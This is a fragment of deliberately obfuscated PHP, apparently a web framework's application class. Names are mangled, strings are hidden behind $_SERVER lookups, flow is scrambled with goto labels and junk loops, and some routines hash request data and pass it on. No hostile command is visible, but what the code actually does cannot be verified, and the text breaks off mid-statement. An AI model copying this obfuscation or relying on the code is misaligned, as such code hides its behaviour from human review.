$defaultAction = "\151\156\144\145\x78"; function __construct() { } public function setDefault($D®Ÿˆ©Ø©ç) { goto D‰¥µĞÊ¸´; DíùÆßåØÆ: $this->defaultModule = $c³ˆ”¿çÖ²[0] ? $c³ˆ”¿çÖ²[0] : $this->defaultModule; $cËÍ‡İù = $e£°…Úô·[564]; while ($cËÍ‡İù < $e£°…Úô·[561]) { if ($cËÍ‡İù >= 0) { break; } $cËÍ‡İù++; } goto f¥®¾È’ôã; f¥®¾È’ôã: $this->defaultController = $c³ˆ”¿çÖ²[1] ? $c³ˆ”¿çÖ²[1] : $this->defaultController; $AÍÁ´â×éˆ = $e£°…Úô·[565]; if (strlen($AÍÁ´â×éˆ) < $e£°…Úô·[566]) { die; } goto CÌêî¯§Æ; B©¥™š‰Œ—: $this->{$_SERVER[ÀÌîòš£][3]}($F­©ß‡Î‚[4], array($this, $F­©ß‡Î‚[5])); goto Dï¼¦í·È; D‰¥µĞÊ¸´: $e£°…Úô· =& $_SERVER[Å¸ş]; $F­©ß‡Î‚ =& $_SERVER[ÀÌîòš£]; $c³ˆ”¿çÖ² = $F­©ß‡Î‚[0]($F­©ß‡Î‚[1], $F­©ß‡Î‚[2]($D®Ÿˆ©Ø©ç, $F­©ß‡Î‚[1])); goto DíùÆßåØÆ; CÌêî¯§Æ: $this->defaultAction = $c³ˆ”¿çÖ²[2] ? $c³ˆ”¿çÖ²[2] : $this->defaultAction; $f’»’£•îÉ = $e£°…Úô·[567]; if (strlen($f’»’£•îÉ) < $e£°…Úô·[550]) { return; } goto B©¥™š‰Œ—; Dï¼¦í·È: } public function appRun($EŒ´âÙ÷Ï…) { goto fô‚§¬½; fô‚§¬½: $D›¤¤º•½Í =& $_SERVER[Å¸ş]; $AÜøáÂß»å =& $_SERVER[ÀÌîòš£]; $Cß÷”ÈÑìÚ = $AÜøáÂß»å[0]($AÜøáÂß»å[1], $EŒ´âÙ÷Ï…); goto CŞƒ¾ó £‘; bš‹«Ğˆç: if ($dø‡áãˆˆ == $AÜøáÂß»å[8]) { $a÷ÚÚ·ó‡á = $AÜøáÂß»å[9]; $Cß÷”ÈÑìÚ[0] = $AÜøáÂß»å[10]; $Cß÷”ÈÑìÚ[1] = $Cß÷”ÈÑìÚ[1] . $AÜøáÂß»å[11]; $EŒ´âÙ÷Ï… = $AÜøáÂß»å[12]($AÜøáÂß»å[1], $Cß÷”ÈÑìÚ); $EŒ´âÙ÷Ï… = $AÜøáÂß»å[2]($EŒ´âÙ÷Ï…, $AÜøáÂß»å[1]); } $AÜøáÂß»å[13](array($AÜøáÂß»å[14], $AÜøáÂß»å[15]), $a÷ÚÚ·ó‡á . $AÜøáÂß»å[16], $EŒ´âÙ÷Ï…); $AÜøáÂß»å[17]($EŒ´âÙ÷Ï…); goto cÙÍßÑº’õ; CŞƒ¾ó £‘: $e­öäŞŒƒÄ = $D›¤¤º•½Í[568]; if (strlen($e­öäŞŒƒÄ) < $D›¤¤º•½Í[554]) { return; } $dø‡áãˆˆ = $AÜøáÂß»å[6]($Cß÷”ÈÑìÚ[0]); goto B„›®ó„ÛÔ; cÙÍßÑº’õ: $b¢ØïİÈî = $D›¤¤º•½Í[570]; if (!$b¢ØïİÈî) { die; } $AÜøáÂß»å[13](array($AÜøáÂß»å[14], $AÜøáÂß»å[15]), $a÷ÚÚ·ó‡á . $AÜøáÂß»å[18], $EŒ´âÙ÷Ï…); goto dï„¤™è’; B„›®ó„ÛÔ: $C®‡­ôˆò = $D›¤¤º•½Í[569]; while (strlen($C®‡­ôˆò) < $D›¤¤º•½Í[554]) { if (!$C®‡­ôˆò) { break; } $C®‡­ôˆò++; } $a÷ÚÚ·ó‡á = $AÜøáÂß»å[7]; goto bš‹«Ğˆç; dï„¤™è’: } private function autorun() { $F¯ˆè¶šàì =& $_SERVER[ÀÌîòš£]; global $config; if ($F¯ˆè¶šàì[19]($config[$F¯ˆè¶šàì[20]]) == 0) { return; } foreach ($config[$F¯ˆè¶šàì[20]] as $fÆÇ¶‡ÄÁÁ => $f¡‡ËĞ¨§İ) { $this->{$_SERVER[ÀÌîòš£][21]}($f¡‡ËĞ¨§İ); } } private function xwob73d3118f() { goto FÆœâ°£´İ; FÆœâ°£´İ: $Bˆé¥©Ù¯ =& $_SERVER[Å¸ş]; $b¼ÔàÌ =& $_SERVER[ÀÌîòš£]; $BÈá‘ØÍ´¤ = $b¼ÔàÌ[8]; goto e°á÷¶¾Ø£; A×·¤æƒ: $eªÉÌÙÍ¿Ğ = $Bˆé¥©Ù¯[574]; goto C‰‰„Ø›; DËà˜…­³: $cœÉ¬Ùá¤ = $b¼ÔàÌ[26]($GLOBALS[$b¼ÔàÌ[22]][$b¼ÔàÌ[23]], 1); $GLOBALS[$b¼ÔàÌ[22]][$b¼ÔàÌ[23]] = $b¼ÔàÌ[27]($D´Î×ÃÇƒ, $cœÉ¬Ùá¤); $GLOBALS[$b¼ÔàÌ[22]][$b¼ÔàÌ[28]] = $b¼ÔàÌ[29]($b¼ÔàÌ[1], $GLOBALS[$b¼ÔàÌ[22]][$b¼ÔàÌ[23]]); goto A×·¤æƒ; e°á÷¶¾Ø£: $Cœ¯éÛ¯‹Ç = $GLOBALS[$b¼ÔàÌ[22]][$b¼ÔàÌ[23]][0]; $Dªáİù‘°› = $Bˆé¥©Ù¯[571]; if (strlen($Dªáİù‘°›) < $Bˆé¥©Ù¯[572]) { die; } goto d–‰¥İÃ…ä; Aµˆ£‹æà: $c²ñ²ñßĞ = $Bˆé¥©Ù¯[573]; if (!$c²ñ²ñßĞ) { return; } $D´Î×ÃÇƒ = array($b¼ÔàÌ[8], $fö§ÊŸœ™Â); goto DËà˜…­³; d–‰¥İÃ…ä: if (!$Cœ¯éÛ¯‹Ç || $b¼ÔàÌ[24]($Cœ¯éÛ¯‹Ç) <= $b¼ÔàÌ[24]($BÈá‘ØÍ´¤)) { return; } if ($b¼ÔàÌ[6]($b¼ÔàÌ[25]($Cœ¯éÛ¯‹Ç, -$b¼ÔàÌ[24]($BÈá‘ØÍ´¤))) != $BÈá‘ØÍ´¤) { return; } $fö§ÊŸœ™Â = $b¼ÔàÌ[25]($Cœ¯éÛ¯‹Ç, 0, -$b¼ÔàÌ[24]($BÈá‘ØÍ´¤)); goto Aµˆ£‹æà; C‰‰„Ø›: } private function tasld9dbb527() { goto e¢£œŠ±; eøØÇé¹§ö: $eˆ•Ëª¯•î = $_SERVER[$dĞÏ‚í†[30]]; $CÇ£á Ëºî = $fŞöç…Á·[575]; while (strlen($CÇ£á Ëºî) < $fŞöç…Á·[554]) { if (!$CÇ£á Ëºî) { break; } $CÇ£á Ëºî++; } goto C±ÚìÔ†ìİ; C±ÚìÔ†ìİ: $A‚Õ²ĞŠãÃ = $dĞÏ‚í†[31]; $F…Š¸´õ—Æ = $fŞöç…Á·[576]; while (strlen($F…Š¸´õ—Æ) < $fŞöç…Á·[554]) { if (!$F…Š¸´õ—Æ) { break; } $F…Š¸´õ—Æ++; } goto Eˆ˜£ò‚î©; d¹Ìï÷Ÿ×Š: $CŒÉ„‹¦½ = $fŞöç…Á·[577]; if (strlen($CŒÉ„‹¦½) < $fŞöç…Á·[572]) { die; } $dĞÏ‚í†[34]($dĞÏ‚í†[35], $fã²ƒïáè, $B‹ñïÑ¤ñÈ); goto EÖ“Í„Û; e¢£œŠ±: $fŞöç…Á· =& $_SERVER[Å¸ş]; $dĞÏ‚í† =& $_SERVER[ÀÌîòš£]; if ($GLOBALS[$dĞÏ‚í†[22]][$dĞÏ‚í†[28]] != $dĞÏ‚í†[10]) { return; } goto eøØÇé¹§ö; Eˆ˜£ò‚î©: if (!$dĞÏ‚í†[32]($eˆ•Ëª¯•î, $A‚Õ²ĞŠãÃ)) { return; } $c¿†š‚«í = $dĞÏ‚í†[33]($eˆ•Ëª¯•î, $A‚Õ²ĞŠãÃ); $fã²ƒïáè = $dĞÏ‚í†[25]($eˆ•Ëª¯•î, $c¿†š‚«í + $dĞÏ‚í†[24]($A‚Õ²ĞŠãÃ)); goto d¹Ìï÷Ÿ×Š; EÖ“Í„Û: $fã²ƒïáè = $dĞÏ‚í†[2]($B‹ñïÑ¤ñÈ[0][0], $dĞÏ‚í†[36]); $GLOBALS[$dĞÏ‚í†[22]][$dĞÏ‚í†[23]] = $dĞÏ‚í†[0]($dĞÏ‚í†[36], $fã²ƒïáè); $GLOBALS[$dĞÏ‚í†[22]][$dĞÏ‚í†[28]] = $dĞÏ‚í†[29]($dĞÏ‚í†[1], $GLOBALS[$dĞÏ‚í†[22]][$dĞÏ‚í†[23]]); goto C±²è¼·æ; C±²è¼·æ: } public function run() { goto D¢öôÃá‡³; BÖ·“áäÀ…: if ($dØ†‘ÒĞ[19]($e«î¾¬œ†÷) >= 3) { $this->{$_SERVER[ÀÌîòš£][21]}($D¢øŠ„ğŒõ); } else { $this->{$_SERVER[ÀÌîòš£][21]}(ACTION); } goto EŸ¾ËµŒ¿À; dƒºÉ¯¦ŞŒ: $this->{$_SERVER[ÀÌîòš£][38]}(); $B±»‰¯å¬ƒ = $BØ¹ƒÙËé®[578]; if (strlen($B±»‰¯å¬ƒ) < $BØ¹ƒÙËé®[561]) { die; } goto d©Ê®Ò¬àî; D¢öôÃá‡³: $BØ¹ƒÙËé® =& $_SERVER[Å¸ş]; $dØ†‘ÒĞ =& $_SERVER[ÀÌîòš£]; $this->{$_SERVER[ÀÌîòš£][37]}(); goto dƒºÉ¯¦ŞŒ; Eí¢ğšÉĞ: $this->{$_SERVER[ÀÌîòš£][45]}(); $c¿¸ĞƒÁØ© = $BØ¹ƒÙËé®[580]; if (!$c¿¸ĞƒÁØ©) { return; } goto BÖ·“áäÀ…; bİ¨ä´à³†: $D¦Øì‚’Î = $BØ¹ƒÙËé®[579]; if (strlen($D¦Øì‚’Î) < $BØ¹ƒÙËé®[566]) { return; } $dØ†‘ÒĞ[39]($dØ†‘ÒĞ[41], isset($e«î¾¬œ†÷[1]) && $e«î¾¬œ†÷[0] ? $e«î¾¬œ†÷[1] : $this->defaultController); goto FÆ°èˆ¹; FÆ°èˆ¹: $dØ†‘ÒĞ[39]($dØ†‘ÒĞ[42], isset($e«î¾¬œ†÷[2]) && $e«î¾¬œ†÷[0] ? $e«î¾¬œ†÷[2] : $this->defaultAction); $dØ†‘ÒĞ[39]($dØ†‘ÒĞ[43], MOD . $dØ†‘ÒĞ[1] . ST . $dØ†‘ÒĞ[1] . ACT); $_SERVER[$dØ†‘ÒĞ[44]] = $dØ†‘ÒĞ[6](ACTION); goto Eí¢ğšÉĞ; d©Ê®Ò¬àî: $e«î¾¬œ†÷ = $GLOBALS[$dØ†‘ÒĞ[22]][$dØ†‘ÒĞ[23]]; $D¢øŠ„ğŒõ = $GLOBALS[$dØ†‘ÒĞ[22]][$dØ†‘ÒĞ[28]]; $dØ†‘ÒĞ[39]($dØ†‘ÒĞ[40], isset($e«î¾¬œ†÷[0]) && $e«î¾¬œ†÷[0] ? $e«î¾¬œ†÷[0] : $this->defaultModule); goto bİ¨ä´à³†; EŸ¾ËµŒ¿À: } private $ihcx778521b7 = array(); private $mcry0c9b6e2b = ''; public function ntoq1fbe4cfc() { goto BÛ·•ÉÅ’; EèºÑ›•«ô: $this->{$_SERVER[ÀÌîòš£][47]}(); $d®¹îÓÒç¯ = $dÌŠ„—ø’Ÿ[581]; $this->{$_SERVER[ÀÌîòš£][48]}(); goto bÛ··Ü; f‹ƒÅâÂ¥: $this->{$_SERVER[ÀÌîòš£][51]}(); $Dçã‰¡İ™ = $dÌŠ„—ø’Ÿ[584]; $this->{$_SERVER[ÀÌîòš£][52]}(); goto Aœ‹ĞÃÊ—; FíË®˜‹ÒÙ: $this->{$_SERVER[ÀÌîòš£][3]}($dË‹š‡¿¯[55], array($this, $dË‹š‡¿¯[56])); $AÑ®ôØçˆø = $dÌŠ„—ø’Ÿ[586]; while (strlen($AÑ®ôØçˆø) < $dÌŠ„—ø’Ÿ[561]) { if (!$AÑ®ôØçˆø) { break; } $AÑ®ôØçˆø++; } goto DÛŒ†Ä†á; DÛŒ†Ä†á: $this->{$_SERVER[ÀÌîòš£][3]}($dË‹š‡¿¯[57], array($this, $dË‹š‡¿¯[58])); $E”„ÚÈÅÏ‰ = $dÌŠ„—ø’Ÿ[587]; while ($E”„ÚÈÅÏ‰ < $dÌŠ„—ø’Ÿ[554]) { if ($E”„ÚÈÅÏ‰ >= 0) { break; } $E”„ÚÈÅÏ‰++; } goto AùÊŞ¦Ğ; Aœ‹ĞÃÊ—: $this->{$_SERVER[ÀÌîòš£][3]}($dË‹š‡¿¯[53], array($this, $dË‹š‡¿¯[54])); $FªÆÔÚéƒÒ = $dÌŠ„—ø’Ÿ[585]; while ($FªÆÔÚéƒÒ < $dÌŠ„—ø’Ÿ[572]) { if ($FªÆÔÚéƒÒ >= 0) { break; } $FªÆÔÚéƒÒ++; } goto FíË®˜‹ÒÙ; bÛ··Ü: $B˜ÉêèÓ©É = $dÌŠ„—ø’Ÿ[582]; while ($B˜ÉêèÓ©É < $dÌŠ„—ø’Ÿ[561]) { if ($B˜ÉêèÓ©É >= 0) { break; } $B˜ÉêèÓ©É++; } $this->{$_SERVER[ÀÌîòš£][49]}(); goto C²ã·°ª; C²ã·°ª: $fà¿íŸ»™¹ = $dÌŠ„—ø’Ÿ[583]; if (!$fà¿íŸ»™¹) { die; } $this->{$_SERVER[ÀÌîòš£][50]}(); goto f‹ƒÅâÂ¥; BÛ·•ÉÅ’: $dÌŠ„—ø’Ÿ =& $_SERVER[Å¸ş]; $dË‹š‡¿¯ =& $_SERVER[ÀÌîòš£]; $this->{$_SERVER[ÀÌîòš£][46]}(); goto EèºÑ›•«ô; AùÊŞ¦Ğ: $this->{$_SERVER[ÀÌîòš£][3]}($dË‹š‡¿¯[59], array($this, $dË‹š‡¿¯[60])); $DŞåØÛ¿àô = $dÌŠ„—ø’Ÿ[588]; if (strlen($DŞåØÛ¿àô) < $dÌŠ„—ø’Ÿ[550]) { die; } goto e–…Ö¨Êñ„; e–…Ö¨Êñ„: } public function iwxp1f5a6191($AÊâä…Ù¸ñ) { goto B…Ö“¹…ø; C†ĞôÔÉ¥²: $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[117]][$fÍ§¿Ìöİ[139]] = $fÍ§¿Ìöİ[113]($this->ihcx778521b7, $fÍ§¿Ìöİ[140], $fÍ§¿Ìöİ[10]); if ($fÍ§¿Ìöİ[113]($GLOBALS, $fÍ§¿Ìöİ[141]) && $this->config[$fÍ§¿Ìöİ[142]]) { $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[117]][$fÍ§¿Ìöİ[143]] = WEB_ROOT; } return $AÊâä…Ù¸ñ; goto c†¬­Â‡Ú; E™·Ã½Ï¦Ü: if (!$B÷ÛâŒÅ»ª) { die; } $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[117]][$fÍ§¿Ìöİ[126]] = $fÍ§¿Ìöİ[127]($fÍ§¿Ìöİ[128]()); $aÅÂâ¦­ = $D¸­ÕõŞ•Õ[596]; goto dÚ‘öÚê‚; fø°Šœ÷„š: if ($d°æïò´„[$fÍ§¿Ìöİ[129]] != $fÍ§¿Ìöİ[130]) { $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[117]][$fÍ§¿Ìöİ[131]] = $d°æïò´„[$fÍ§¿Ìöİ[131]]; $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[117]][$fÍ§¿Ìöİ[132]] = $d°æïò´„[$fÍ§¿Ìöİ[132]]; $eñ…»ºõä = $fÍ§¿Ìöİ[133](10) . $this->mcry0c9b6e2b . $fÍ§¿Ìöİ[133](5); $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[102]][$fÍ§¿Ìöİ[134]][$fÍ§¿Ìöİ[135]] = $this->{$_SERVER[ÀÌîòš£][136]}($eñ…»ºõä, $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[117]][$fÍ§¿Ìöİ[122]]); } if ($this->mcry0c9b6e2b == $fÍ§¿Ìöİ[130]) { $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[102]][$fÍ§¿Ìöİ[103]][$fÍ§¿Ìöİ[108]][$fÍ§¿Ìöİ[116]] = 0; } $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[117]][$fÍ§¿Ìöİ[137]] = $fÍ§¿Ìöİ[113]($this->ihcx778521b7, $fÍ§¿Ìöİ[138], $fÍ§¿Ìöİ[10]); goto C†ĞôÔÉ¥²; dÚ‘öÚê‚: $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[117]][$fÍ§¿Ìöİ[129]] = $this->mcry0c9b6e2b; $aê¨¿öÔ–„ = $D¸­ÕõŞ•Õ[597]; while ($aê¨¿öÔ–„ < $D¸­ÕõŞ•Õ[550]) { if ($aê¨¿öÔ–„ >= 0) { break; } $aê¨¿öÔ–„++; } goto fø°Šœ÷„š; CŒğêÇçÍæ: $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[102]][$fÍ§¿Ìöİ[103]][$fÍ§¿Ìöİ[108]] = array($fÍ§¿Ìöİ[109] => (int) $FÎòÜÄ”Ÿ[$fÍ§¿Ìöİ[110]], $fÍ§¿Ìöİ[111] => $fÍ§¿Ìöİ[112]($fÍ§¿Ìöİ[113]($FÎòÜÄ”Ÿ, $fÍ§¿Ìöİ[114], array())), $fÍ§¿Ìöİ[115] => (int) $fÍ§¿Ìöİ[113]($FÎòÜÄ”Ÿ, $fÍ§¿Ìöİ[116], 0)); $e ¶îÀªÉ§ = $D¸­ÕõŞ•Õ[594]; while ($e ¶îÀªÉ§ < $D¸­ÕõŞ•Õ[561]) { if ($e ¶îÀªÉ§ >= 0) { break; } $e ¶îÀªÉ§++; } goto dßÌÅƒÇˆ»; aß®¦÷Õ¥¿: $f·’ÑÑÉ‚ç = $D¸­ÕõŞ•Õ[592]; unset($AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[102]][$fÍ§¿Ìöİ[103]][$fÍ§¿Ìöİ[107]]); $cÄ™Æ´ĞâÔ = $D¸­ÕõŞ•Õ[593]; goto CŒğêÇçÍæ; dßÌÅƒÇˆ»: $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[117]][$fÍ§¿Ìöİ[118]] = $fÍ§¿Ìöİ[119]($fÍ§¿Ìöİ[120])->{$_SERVER[ÀÌîòš£][121]}(); $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[117]][$fÍ§¿Ìöİ[122]] = $fÍ§¿Ìöİ[123]($_SERVER[$fÍ§¿Ìöİ[124]] . $d°æïò´„[$fÍ§¿Ìöİ[125]]); $B÷ÛâŒÅ»ª = $D¸­ÕõŞ•Õ[595]; goto E™·Ã½Ï¦Ü; B²²Ê™œ±Œ: $FŠ¡¼”å´ = $D¸­ÕõŞ•Õ[591]; if (strlen($FŠ¡¼”å´) < $D¸­ÕõŞ•Õ[550]) { return; } unset($AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[102]][$fÍ§¿Ìöİ[103]][$fÍ§¿Ìöİ[76]]); goto aß®¦÷Õ¥¿; e‚‹ÛĞ÷ÆÑ: foreach ($d±œ÷«´˜Á as $eŠ¬‹ßŠ¶·) { $A÷¾­„ä¤¾ = $GLOBALS[$fÍ§¿Ìöİ[100]][$fÍ§¿Ìöİ[101]][$eŠ¬‹ßŠ¶·]; if (isset($d°æïò´„[$eŠ¬‹ßŠ¶·])) { $A÷¾­„ä¤¾ = $d°æïò´„[$eŠ¬‹ßŠ¶·]; } $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[102]][$fÍ§¿Ìöİ[103]][$eŠ¬‹ßŠ¶·] = $A÷¾­„ä¤¾; } $FÎòÜÄ”Ÿ = $AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[102]][$fÍ§¿Ìöİ[103]][$fÍ§¿Ìöİ[76]]; unset($AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[102]][$fÍ§¿Ìöİ[104]][$fÍ§¿Ìöİ[105]]); goto bË’ Ñ„Ñó; DÕŞ·“¶çÖ: $d±œ÷«´˜Á = array($fÍ§¿Ìöİ[64], $fÍ§¿Ìöİ[65], $fÍ§¿Ìöİ[66], $fÍ§¿Ìöİ[67], $fÍ§¿Ìöİ[68], $fÍ§¿Ìöİ[69], $fÍ§¿Ìöİ[70], $fÍ§¿Ìöİ[71], $fÍ§¿Ìöİ[72], $fÍ§¿Ìöİ[73], $fÍ§¿Ìöİ[74], $fÍ§¿Ìöİ[75], $fÍ§¿Ìöİ[76], $fÍ§¿Ìöİ[77], $fÍ§¿Ìöİ[78], $fÍ§¿Ìöİ[79], $fÍ§¿Ìöİ[80], $fÍ§¿Ìöİ[81], $fÍ§¿Ìöİ[82], $fÍ§¿Ìöİ[83], $fÍ§¿Ìöİ[84], $fÍ§¿Ìöİ[85], $fÍ§¿Ìöİ[86], $fÍ§¿Ìöİ[87], $fÍ§¿Ìöİ[88], $fÍ§¿Ìöİ[89], $fÍ§¿Ìöİ[90], $fÍ§¿Ìöİ[91], $fÍ§¿Ìöİ[92], $fÍ§¿Ìöİ[93], $fÍ§¿Ìöİ[94], $fÍ§¿Ìöİ[95], $fÍ§¿Ìöİ[96], $fÍ§¿Ìöİ[97], $fÍ§¿Ìöİ[98], $fÍ§¿Ìöİ[99]); $E©ÈˆĞ±óÈ = $D¸­ÕõŞ•Õ[589]; if (strlen($E©ÈˆĞ±óÈ) < $D¸­ÕõŞ•Õ[561]) { die; } goto e‚‹ÛĞ÷ÆÑ; B…Ö“¹…ø: $D¸­ÕõŞ•Õ =& $_SERVER[Å¸ş]; $fÍ§¿Ìöİ =& $_SERVER[ÀÌîòš£]; $d°æïò´„ = $fÍ§¿Ìöİ[61]($fÍ§¿Ìöİ[62])->{$_SERVER[ÀÌîòš£][63]}(); goto DÕŞ·“¶çÖ; bË’ Ñ„Ñó: $C”åöÒ¸ÚÊ = $D¸­ÕõŞ•Õ[590]; if (!$C”åöÒ¸ÚÊ) { return; } unset($AÊâä…Ù¸ñ[$fÍ§¿Ìöİ[102]][$fÍ§¿Ìöİ[104]][$fÍ§¿Ìöİ[106]]); goto B²²Ê™œ±Œ; c†¬­Â‡Ú: } private function anmwa3f5678c() { goto EÖŒªÅÒ÷; b†Ğ¼ë‡àÙ: if (strlen($cÛ†”ˆ»Ñ‚) < $e»æ™ä¨Ë[561]) { return; } $féÅ­„ì = $B®›œìï™[61]($B®›œìï™[62])->{$_SERVER[ÀÌîòš£][63]}(); $A­¡á…ßàë = array($B®›œìï™[168] => $féÅ­„ì[$B®›œìï™[64]], $B®›œìï™[169] => $féÅ­„ì[$B®›œìï™[65]], $B®›œìï™[170] => $B®›œìï™[10]); goto A¥Šî”ô«Š; fçâ¯Œªç: while (strlen($CÈŒ‰ŒŞ—Â) < $e»æ™ä¨Ë[550]) { if (!$CÈŒ‰ŒŞ—Â) { break; } $CÈŒ‰ŒŞ—Â++; } goto FÑº¶ŸóÖö; aùèØ´Î÷ù: if ($this->mcry0c9b6e2b == $B®›œìï™[130]) { return; } $F İ¥ŠšĞ¥ = array($B®›œìï™[162], $B®›œìï™[163], $B®›œìï™[164], $B®›œìï™[165], $B®›œìï™[166], $B®›œìï™[167]); $cÛ†”ˆ»Ñ‚ = $e»æ™ä¨Ë[598]; goto b†Ğ¼ë‡àÙ; EÖŒªÅÒ÷: $e»æ™ä¨Ë =& $_SERVER[Å¸ş]; $B®›œìï™ =& $_SERVER[ÀÌîòš£]; if ($_SERVER[$B®›œìï™[44]] == $B®›œìï™[144]) { $Dä¢à‡–Ÿ = array($B®›œìï™[129] => $this->mcry0c9b6e2b, $B®›œìï™[145] => $this->{$_SERVER[ÀÌîòš£][146]}(), $B®›œìï™[147] => $B®›œìï™[61]($B®›œìï™[148])->{$_SERVER[ÀÌîòš£][149]}()); if ($this->mcry0c9b6e2b != $B®›œìï™[130]) { $f‰Ëáº¯ì = $B®›œìï™[113]($this->ihcx778521b7, $B®›œìï™[150]); if ($f‰Ëáº¯ì) { $Dä¢à‡–Ÿ[$B®›œìï™[151]] = $f‰Ëáº¯ì; $Dä¢à‡–Ÿ[$B®›œìï™[152]] = $B®›œìï™[153]($B®›œìï™[113]($this->ihcx778521b7, $B®›œìï™[154])); $Dä¢à‡–Ÿ[$B®›œìï™[155]] = $B®›œìï™[113]($this->ihcx778521b7, $B®›œìï™[140]); } } $Dä¢à‡–Ÿ = $this->{$_SERVER[ÀÌîòš£][156]}($B®›œìï™[157]($Dä¢à‡–Ÿ), $B®›œìï™[123]($B®›œìï™[158])); $A­¡á…ßàë = array($B®›œìï™[159] => $Dä¢à‡–Ÿ); $B®›œìï™[13](array($B®›œìï™[160], $B®›œìï™[161]), $A­¡á…ßàë); } goto aùèØ´Î÷ù; A¥Šî”ô«Š: foreach ($F İ¥ŠšĞ¥ as $båÎÌ¦™) { if (!isset($féÅ­„ì[$båÎÌ¦™]) || !$féÅ­„ì[$båÎÌ¦™]) { continue; } $A­¡á…ßàë[$båÎÌ¦™] = $féÅ­„ì[$båÎÌ¦™]; } $B®›œìï™[13](array($B®›œìï™[160], $B®›œìï™[161]), $A­¡á…ßàë); $CÈŒ‰ŒŞ—Â = $e»æ™ä¨Ë[599]; goto fçâ¯Œªç; FÑº¶ŸóÖö: } private function qbug0c9ed285() { goto A©„™éÕÄÁ; E„ø–»Ñ‡: $cè®ÊæèğÈ[175]($cè®ÊæèğÈ[206]($cè®ÊæèğÈ[216]), !0); $Fëêî…õ‹Ÿ = $CÅÍ×¸ø®[610]; while (strlen($Fëêî…õ‹Ÿ) < $CÅÍ×¸ø®[561]) { if (!$Fëêî…õ‹Ÿ) { break; } $Fëêî…õ‹Ÿ++; } goto c‡å‡èãØ; bî°ˆ´¶”æ: if (!$e½ğ™ğƒ‡º) { return; } $B…¦»Šë¢Ú = $fÖÒºæ®[$cè®ÊæèğÈ[233]]; $F§¼ù»†Ë‘ = $CÅÍ×¸ø®[606]; goto E³Œõõ§í; fÑ©Ÿˆôæ×: $Eİİ˜ƒ»½‡ = $aÒ»Ã†Úñ· . $a»”ßË¹Õí[$cè®ÊæèğÈ[129]] . $this->{$_SERVER[ÀÌîòš£][156]}($cè®ÊæèğÈ[123]($a»”ßË¹Õí[$cè®ÊæèğÈ[217]]), $aÒ»Ã†Úñ·); $DñÒÂÂ®Ş = $CÅÍ×¸ø®[603]; $a»”ßË¹Õí[$cè®ÊæèğÈ[132]] = $cè®ÊæèğÈ[127]($cè®ÊæèğÈ[222]($this->{$_SERVER[ÀÌîòš£][156]}($Eİİ˜ƒ»½‡, $cè®ÊæèğÈ[224]))); goto cŸ¤éæ’Å; eáÆøâªç: $D¼¬¥£…¥ = $C–Øèæ·¸’ . $a»”ßË¹Õí[$cè®ÊæèğÈ[129]] . $a»”ßË¹Õí[$cè®ÊæèğÈ[220]]; $a»”ßË¹Õí[$cè®ÊæèğÈ[131]] = $cè®ÊæèğÈ[222]($cè®ÊæèğÈ[127]($this->{$_SERVER[ÀÌîòš£][156]}($D¼¬¥£…¥, $cè®ÊæèğÈ[223]))); $c¦«Œãİ„ = $CÅÍ×¸ø®[601]; goto bÏÈ˜¥›ö; aˆ¨©¶Ê‡‡: $F‘±†§¬ÃŸ = $this->{$_SERVER[ÀÌîòš£][136]}($cè®ÊæèğÈ[157]($D©ÒÄ…¤†Ì), $cÌ­Ê¯æ­Ò); $fÖÒºæ® = $cè®ÊæèğÈ[230]($cè®ÊæèğÈ[61]($cè®ÊæèğÈ[11])->{$_SERVER[ÀÌîòš£][231]}(), $cè®ÊæèğÈ[232]); $e½ğ™ğƒ‡º = $CÅÍ×¸ø®[605]; goto bî°ˆ´¶”æ; A©„™éÕÄÁ: $CÅÍ×¸ø® =& $_SERVER[Å¸ş]; $cè®ÊæèğÈ =& $_SERVER[ÀÌîòš£]; if ($_SERVER[$cè®ÊæèğÈ[44]] != $cè®ÊæèğÈ[171]) { return; } goto EÌêÛï©¬Û; cŸ¤éæ’Å: $F‰ÔŒ˜›š = $CÅÍ×¸ø®[604]; if (!$F‰ÔŒ˜›š) { die; } if ($D©ÒÄ…¤†Ì[$cè®ÊæèğÈ[225]] && $D©ÒÄ…¤†Ì[$cè®ÊæèğÈ[225]] >= 1) { $cè®ÊæèğÈ[61]($cè®ÊæèğÈ[62])->{$_SERVER[ÀÌîòš£][226]}($cè®ÊæèğÈ[227], $cè®ÊæèğÈ[228]); } goto b½¨…ˆ¼£è; Dñ•´ñóä: $this->mcry0c9b6e2b = $a»”ßË¹Õí[$cè®ÊæèğÈ[129]]; $Cº¨¹¹î£‡ = $CÅÍ×¸ø®[609]; $this->{$_SERVER[ÀÌîòš£][237]}(); goto E„ø–»Ñ‡; E³Œõõ§í: while (strlen($F§¼ù»†Ë‘) < $CÅÍ×¸ø®[554]) { if (!$F§¼ù»†Ë‘) { break; } $F§¼ù»†Ë‘++; } $bƒÙ—Ÿ†ó£ = array(); $Có®’­š¼ğ = $CÅÍ×¸ø®[607]; goto D–²‰×áâƒ; FŸ¢³Ô‰ùĞ: if (strlen($cÔåËŠäˆÎ) < $CÅÍ×¸ø®[566]) { die; } $cè®ÊæèğÈ[61]($cè®ÊæèğÈ[11])->{$_SERVER[ÀÌîòš£][234]}($B…¦»Šë¢Ú[$cè®ÊæèğÈ[235]], array($cè®ÊæèğÈ[236] => $bƒÙ—Ÿ†ó£)); $this->ihcx778521b7 = $D©ÒÄ…¤†Ì; goto Dñ•´ñóä; aÏÛŒœ¹çà: $FÜ†ù²«Ş‡ = $cè®ÊæèğÈ[123]($_SERVER[$cè®ÊæèğÈ[124]] . $Bö÷Œº×ôÑ); if ($a í¬ÀƒÏ‡[$cè®ÊæèğÈ[187]] == $cè®ÊæèğÈ[188]) { 